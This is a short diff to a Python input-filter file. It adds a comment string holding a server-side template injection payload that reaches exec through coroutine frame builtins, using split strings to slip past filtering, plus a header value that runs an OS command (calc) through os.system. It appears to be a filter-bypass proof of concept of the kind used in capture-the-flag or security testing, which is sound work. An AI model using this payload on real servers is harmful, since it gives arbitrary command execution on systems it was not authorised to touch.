@@ -7,6 +7,16 @@ import os
 import re
 
 
+'''
+{% autoescape request.server_connection._serving_future._coro.cr_frame.f_builtins['exe'+'c'] %}
+{{ request.headers["z"] }}
+
+headers:
+z: __import__("os").system("calc")
+
+'''
+
+
 def filter(data):
     data = unicodedata.normalize('NFKD', data)
     if len(data) > 1024:
